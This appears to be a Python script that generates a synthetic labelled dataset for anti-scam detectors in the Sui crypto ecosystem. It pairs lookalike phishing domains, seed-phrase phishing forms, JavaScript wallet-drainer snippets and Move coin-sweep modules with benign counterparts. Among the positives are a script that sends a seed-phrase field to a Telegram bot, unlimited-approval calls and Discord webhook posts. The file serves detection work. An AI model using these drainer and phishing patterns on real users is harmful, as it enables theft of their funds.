"""Synthetic labelled corpus for the anti-scam detectors.  Invented, inert, pattern-only snippets.
Positives were written by hand from public descriptions of drainer and phishing techniques; they are
not captured from real campaigns.  Negatives mix invented benign samples with real data (see tests)."""
import json
from pathlib import Path

bad_domains = ["suii-airdrop.xyz", "claim-sui.top", "sui-wallet-verify.click", "mysten-labs-support.site", "suiwallet-recover.online",
 "walrus-airdrop.live", "sui.airdrop-claim.xyz", "mystenlabs.verify-wallet.top", "xn--sui-9la.com", "su1-rewards.xyz", "suiw4llet-login.app",
 "mysten1abs-support.link", "suiwalet-connect.xyz", "walrus-claim.icu", "sui-giveaway.cc", "suiwa1let-unlock.top", "wallrus-airdrop.xyz",
 "sui-validate-wallet.site", "mystenlabs-bonus.click", "suiscan-login.xyz", "sulwallet-claim.top", "walrus.reward-claim.live",
 "mystn-support.site", "suiexplorer.recover-wallet.xyz", "suiwallet-support.top"]
good_domains = ["sui.io", "docs.sui.io", "mystenlabs.com", "blog.mystenlabs.com", "suiscan.xyz", "suivision.xyz", "walrus.xyz", "github.com", "example.org",
 "nytimes.com", "wikipedia.org", "rust-lang.org", "nodejs.org", "suitcase-store.com", "suitable.example", "pursuit.example", "stripe.com", "cloudflare.com",
 "ethereum.org", "coinbase.com", "kraken.com", "walruses-of-alaska.org", "sunrise-bakery.com", "mystery-novels.net", "waltrus-electric.com",
 "aws.amazon.com", "python.org", "wallet.example", "sui-fan-art.example", "learn-move-language.dev"]
bad_pages = [
 '<title>Sui Wallet Recovery</title><form action="https://collect.example/x"><label>Enter your 12-word seed phrase</label><textarea name="s"></textarea></form>',
 '<title>Claim your SUI airdrop</title><p>Act now, limited time.</p><form><input name="mnemonic" placeholder="secret recovery phrase"></form>',
 '<h1>Wallet validation</h1><p>Your account will be suspended within 24 hours</p><input name="privatekey" placeholder="private key">',
 '<title>Walrus rewards</title><form action="https://x.example/p"><input placeholder="24-word recovery phrase"></form>',
 '<script>fetch("https://api.telegram.org/bot123:abc/sendMessage?text="+document.forms[0].elements[0].value)</script><form><input name="seed phrase"></form>',
 '<title>Mysten support</title><p>Validate your wallet now</p><form action="https://help-desk.example/s"><textarea placeholder="mnemonic"></textarea></form>',
]
good_pages = [
 '<title>Sui Docs</title><h1>Wallet Standard</h1><p>Never share your seed phrase with anyone. Support will never ask for it.</p>',
 '<title>Contact</title><form action="/contact"><input name="email"><textarea name="msg"></textarea></form>',
 '<title>Blog</title><p>How to back up your recovery phrase safely: write it on paper and store it offline.</p>',
 '<title>Login</title><form action="/login"><input name="user"><input type="password" name="pw"></form>',
 '<title>Connect</title><button id="connect">Connect wallet</button><p>You will be asked to approve in your wallet extension.</p>',
 '<title>Newsletter</title><form action="https://list.example/subscribe"><input name="email"></form><p>Limited time: 20% off swag</p>',
 '<h1>Security tips</h1><p>Scammers ask for your private key within minutes of contact. Do not comply.</p>',
 '<title>Pricing</title><table><tr><td>Plan</td></tr></table>',
]
bad_js = [
 "const tx=new Transaction();const c=await client.getAllCoins({owner});tx.transferObjects(c.data.map(x=>tx.object(x.coinObjectId)),'0x" + "ab"*32 + "');",
 "const tx=new Transaction();const [all]=tx.splitCoins(tx.gas,[bal]);tx.transferObjects([all],'0x" + "cd"*32 + "');",
 "await token.approve(spender, MaxUint256);await nft.setApprovalForAll(attacker, true);",
 "ethereum.request({method:'eth_sign',params:[addr,'0x" + "11"*32 + "']})",
 "var _0xa1b2=['a'],_0xb2c3=['b'],_0xc3d4=['c'],_0xd4e5=['d'],_0xe5f6=['e'];fetch('https://discord.com/api/webhooks/1/x',{method:'POST'})",
 "wallet.signAndExecuteTransaction({tx}); const message='verify your wallet to claim airdrop'",
 "const MAX=2**256-1; erc20.approve(drain, MAX_UINT)",
 "tx.transferObjects(coins,'0x" + "ef"*32 + "');fetch('https://api.telegram.org/bot1:a/sendMessage')",
]
good_js = [
 "const tx=new Transaction();const [coin]=tx.splitCoins(tx.gas,[amount]);tx.transferObjects([coin],recipient);",
 "const balance=await client.getBalance({owner});console.log(balance.totalBalance);",
 "export function connect(){return wallet.requestAccounts()}",
 "await token.approve(spender, amount);",
 "const sig=await wallet.signPersonalMessage({message:new TextEncoder().encode('Sign in to Example')});",
 "tx.transferObjects([obj],tx.pure.address(userInput));",
 "function add(a,b){return a+b}module.exports={add}",
 "fetch('/api/prices').then(r=>r.json())",
]
bad_move = [
 "module drain::sweep { public entry fun claim<T>(c: Coin<T>, ctx: &mut TxContext) { transfer::public_transfer(c, @0xbadbadbadbadbadbad); } }",
 "module drain::s2 { public fun take_all(w: &mut Wallet, ctx: &mut TxContext) { let b = balance::withdraw_all(&mut w.bal); transfer::public_transfer(coin::from_balance(b, ctx), @0xdeadbeefdeadbeef); } }",
 "module x::reward { public entry fun airdrop<T>(c: Coin<T>) { transfer::public_transfer(c, @0xcafecafecafecafe); } }",
]
good_move = [
 "module ok::pay { public entry fun pay<T>(c: Coin<T>, to: address) { transfer::public_transfer(c, to); } }",
 "module ok::vault { public fun withdraw(cap: &AdminCap, v: &mut Vault, ctx: &mut TxContext): Coin<SUI> { coin::take(&mut v.bal, 1, ctx) } }",
 "module ok::burn { const DEAD: address = @0x0; public fun noop() {} }",
]
S = []
for d in bad_domains: S.append(["domain", d, True])
for d in good_domains: S.append(["domain", d, False])
for t in bad_pages: S.append(["page", t, True])
for t in good_pages: S.append(["page", t, False])
for t in bad_js: S.append(["js", t, True])
for t in good_js: S.append(["js", t, False])
for t in bad_move: S.append(["move", t, True])
for t in good_move: S.append(["move", t, False])
Path("data/synthetic").mkdir(parents=True, exist_ok=True)
json.dump(S, open("data/synthetic/abuse_corpus.json", "w"), indent=1)
print(len(S), sum(1 for s in S if s[2]))
